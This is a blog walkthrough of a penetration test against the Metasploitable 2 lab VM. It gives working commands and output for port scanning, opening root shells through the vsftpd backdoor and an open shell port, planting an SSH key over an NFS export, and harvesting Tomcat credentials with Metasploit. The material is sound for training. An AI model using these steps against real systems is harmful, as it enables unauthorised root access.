---
layout: post
title: "metasploitable-2"
date: 2015-03-15 21:01:25 +0530
comments: true
categories:
- Vulhub
- Rapid 7
- Kali Linux
---
<p>Metasploitable 2 is virtual machine based on Linux, which contains several vulnerabilities to  exploit using `Metasploit` framework as well other security tools.

* **Author: [[Rapid7](https://community.rapid7.com)].** 
* **Series: [Metasploitable].**
* **Release Date: [12 Jun 2012].**
* **Download Link: [[vulnhub](http://download.vulnhub.com/metasploitable/metasploitable-linux-2.0.0.zip.torrent)].**

##Method
* Used ***Netdiscover*** to identify the target IP of the remote machine.
* Used ***Nmap*** to Banner grabbed the services running on the open ports.
* Used ***Metasploit*** to exploit open ports and running services.
* Used ***Netcat*** for making a reverse shell.

##Tools Used
* Metasploitable_2 [8825F2509A9B9A58EC66BD65EF83167F]
* Netdiscover [Can be found in Kali Linux]
* Nmap [Can be found in Kali Linux]
* Metasploit [Can be found in Kali Linux]
* Netcat [Can be found in Kali Linux]

##Walkthrough
<p>As a initial stage we downloaded the vm and imported to VMware Workstation. After successful import, we started to do a discovery 
of target ip by running the `Netdiscover` command.
``` ruby Netdiscover Output
root@Hacker:~# netdiscover -r 192.168.2.0/24
192.168.2.7     00:0c:29:fa:dd:2a    01    060   VMware, Inc.
```                                                        
<p> After the discovery of target ip, we ran `Nmap` to identify the open ports of the target ip. Which gave us 
a huge list of port no along with their state (open|closed|filterd), service, and Version.
``` ruby Nmap Output
root@Hacker:~# nmap -sS -sV -p 1-10000 192.168.2.7

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-24 09:32 IST
Nmap scan report for 192.168.2.7
Host is up (0.00011s latency).
Not shown: 9974 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  rmiregistry GNU Classpath grmiregistry
1524/tcp open  shell       Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         Unreal ircd
6697/tcp open  irc         Unreal ircd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
MAC Address: 00:0C:29:FA:DD:2A (VMware)
``` 
<p>Later on, we started to exploit the ports one by one using ***`Metasploit`***. Before we started to exploit, we did a 
google search on each version to identify whether we could be able to exploit them.<p />

####Note:
<p>A Vulnerability Assessment can be done on the corresponding target ip to identify whether the running serives are vulnerable to exploit.<p />
<p>Vulnerability Assessment Tools:<p />
(1)Nessus
(2)OpenVAS
(3)ImmunityCanvas
(4)Qualys

##FTP Backdoor
####1.Gaining Shell via Metasploit
<p>The Virtual machine was found to be running a ***`FTP`*** service with version ***`vsftpd 2.3.4`*** which was vulnerable to a backdoor 
command execution. We ran the metasploit ***`msfconsole`*** in kali linux and made a search on ***vsftpd***  which gave us exploit module 
for the backdoor command execution for the specific ***vsftpd 2.3.4***
``` ruby Vsftpd 2.3.4
msf > search vsftpd
Matching Modules
================
   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```
Kick this module into the msfconsole to make a backdoor to gain a interactive shell.

{% img http://i.imgur.com/QBxOc7w.png %}

Finally we gained the shell with the help of metasploit vsftpd backdoor module.
####2.Gaining shell via Netcat
<p> We can also backdoor ftp by running up `Netcat` (Reads and writes to TCP and UDP network connections) to gain a shell.<p />
<p>Initially run this command in separate terminal to make a connection to `FTP` port `21` via USER `anyname:)` along with the smile `:)` and PASS with `anypassword`
<p />
``` ruby Netcat FTP 
root@Hacker:~# nc 192.168.2.7 21 -v
192.168.2.7: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.2.7] 21 (ftp) open
220 (vsFTPd 2.3.4)
USER sellva:)
331 Please specify the password.
PASS pass
```
<p>Then open up a new terminal without closing the above running terminal, type in the nc command show below. Where Port `6200` is a Backdoor port for the ftp
and -v mentions Verbose.<p/><p> You can also do without `-v`, it just print out messages on Standard Error, such as when a connection occurs.<p/>

``` ruby Netcat FTP
root@Hacker:~# nc 192.168.2.7 6200 -v
192.168.2.7: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.2.7] 6200 (?) open
id
uid=0(root) gid=0(root)
whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:fa:dd:2a  
          inet addr:192.168.2.7  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fefa:dd2a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:72642 errors:0 dropped:0 overruns:0 frame:0
          TX packets:20426 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:77577863 (73.9 MB)  TX bytes:1589401 (1.5 MB)
          Interrupt:19 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1670 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1670 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:793069 (774.4 KB)  TX bytes:793069 (774.4 KB)

ls
bin
boot
cdrom
dev
etc
home
```
<p>Voila!!!Finally we also got a shell with the help of Netcat tool.<p/>

##Samba Exploit

<p>The current version of `samba server` installed on the remote host is affected by a command execution vulerability,
where there is no needed of authentication to exploit this vulnerability. We kick started the metasploit, and we chose the below exploit module 
which helped us to gain the Root access of the remote system.<p/>
 
{% img http://i.imgur.com/OsaoIOl.png %}

<p>Finally!!! We rooted into remote system using the samba exploit.<p />

##RMI Registry Exploit
<p>After some break, we analyzed the nmap result along with some google results , we came to know that the remote 
machine runs ***`rmiregistry`*** on port ***1099*** was found to be vulnerable. We exploited the same using metasploit `java_rmi_server` module 
to gain root access to the remote system.<p/>

{% img http://i.imgur.com/sqhjAFy.png %}

##Root Access
<p> The remote system was running up with a service named `shell`  on port `1524`, we made a `Netcat` connection to the port and wow!
i was not prompted with any user name and password for entering. Directly i was able to access the root shell.

{% img http://i.imgur.com/igj2yb8.png %}

##SSH through NFS
Network File system `[NFS]` was found to be open on Port `2049` where RPC was also found to be open on port `111`. So we made a `rpcinfo` to identify NFS
and `showmount` to identify the mountpoint to export a local file to remote system.
``` ruby Rpcinfo
root@Hacker:~# rpcinfo -p 192.168.2.7
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  47286  status
    100024    1   tcp  43411  status
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100021    1   udp  58082  nlockmgr
    100021    3   udp  58082  nlockmgr
    100021    4   udp  58082  nlockmgr
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100021    1   tcp  51154  nlockmgr
    100021    3   tcp  51154  nlockmgr
    100021    4   tcp  51154  nlockmgr
    100005    1   udp  47566  mountd
    100005    1   tcp  44007  mountd
    100005    2   udp  47566  mountd
    100005    2   tcp  44007  mountd
    100005    3   udp  47566  mountd
    100005    3   tcp  44007  mountd
```
<p> Rpcinfo shows the NFS is open.<p/>

``` ruby Showmount
root@Hacker:~# showmount -e 192.168.2.7
Export list for 192.168.2.7:
/ *
```
<p> using showmount -e we found that the "/" share (the root of the file system) is being exported.By making use of 
this share we started to access the system with a writeable filesystem.<p/>

<p>Based on nmap result we found that `SSH` service was running on port `22`, So we started to generate a new SSH key on our attacking system,
Later we created a new directory for mounting to the NFS export and add our key to the root user account's authorized_keys file.<p/>
``` ruby SSH keygen
root@Hacker:~# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
/root/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
9d:69:ed:f6:c8:fd:55:e7:e6:de:9b:d8:18:b3:48:18 root@Hacker
The key's randomart image is:
+--[ RSA 2048]----+
|                 |
|                 |
|                 |
|         . +     |
|        SE= .   o|
|         .o.   .o|
|         . .oo  +|
|          .o.+Bo+|
|           .o+o**|
+-----------------+
--->create a directory anywere for mounting purpose

root@Hacker:~# mkdir /tmp/dsm
root@Hacker:~# mount -t nfs 192.168.2.7:/ /tmp/dsm/ -o nolock

--->copying our ssh to the remote root folder through mount share
root@Hacker:~# cat ~/.ssh/id_rsa.pub >> /tmp/dsm/root/.ssh/authorized_keys

---> Finally Do the ssh
root@Hacker:~# ssh root@192.168.2.7
Last login: Sun Aug 24 22:33:44 2014 from :0.0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# id;uname -a;
uid=0(root) gid=0(root) groups=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root@metasploitable:~# 

```
##Backdoors
#### UnrealIRCD Backdoor
<p>The remote machine was running a UnreaIRCD IRC daemon. Later we found that this version contains a backdoor that can be triggered 
by sending the letters "AB" following by a system command to the server on any listening port.<p/> 
<p>Metasploit has a module to exploit this in order to gain an interactive shell, as shown below.<p/>

{% img http://i.imgur.com/sJXmibS.png %}


##Backdoor by Nature
<p>Distccd is a free distributed c/c++ compiler runs on port `3632`, which was found to be vunerable for a backoor. 
The problem with this service is that any user can easily abuse it to run a command of their choice to gain a interactive shell. 
We achieved a interactive shell via the metasploit module, as shown below<p/>

{% img http://i.imgur.com/svGBRIE.png %}

##Remote Code execution
<p> The `drb` service running on port `8787` was vulnerable to  remote code execution. We exploited this vulnerability using the 
metasploit module which is coded below<p/>

{% img http://i.imgur.com/RFNiuju.png %}

##Web Backdoor
<p>For a while we were exploiting the vulnerabilities only on network side, and we didnt even exploit any of the web services.
So we now decided do a web backoor and were looing for a suitable service to do so. By doing a quick scan through our human eyes into the nmap
results we found a `Apache tomcat` service running on port `8180`. The following page will appear if you browse this port with the 
target ip<p />


{% img http://i.imgur.com/cbHaPwG.png %}

<p>Take a look at the webpage, you could see a Administration column containing:<p />
1. status
2. Tomcat administration
3. Tomcat manager

<p>we just made a click on one of the link, suddenly a Authentication page appears saying enter the `UserName` and `Password`. when we got this
we thougt that we could not exploit the page. But its not the case, we decided to do a search in metasploit about tomcat to find any 
modules for exploiting and we got a list of modules. Then we decided to run the specific auxiliary modules which would result you the
username and password of the tomcat administrator. The metasploit auxiliary module is shown below.<p/>

``` ruby Tomcat Auxiliary scan 
auxiliary/admin/http/tomcat_administration
```
<p>After a while the scan was complete and we got the username and passowrd for tomcat administration whihc is shown below<p/>
``` ruby Tomcat_administration
msf > use auxiliary/admin/http/tomcat_administration
msf auxiliary(tomcat_administration) > set RHOSTS 192.168.2.7
RHOSTS => 192.168.2.7
msf auxiliary(tomcat_administration) > run 

[*] http://192.168.2.7:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
```
<p>Now we could make use of this tomcat username and password to gain a interactive shell using the below metasploit module<p/>

{% img http://i.imgur.com/tzP9aaf.png %}

<p>Finaly we got out shell!!!!!.<p/>

****Game Over***

<p> Its Time to endup this Pentesting Roadmap of Metasploitable 2. ***Game Over Guys***. Stay tuned each weekend i will get back with 
different VM's with different ways of Getting the Flag.<p/>
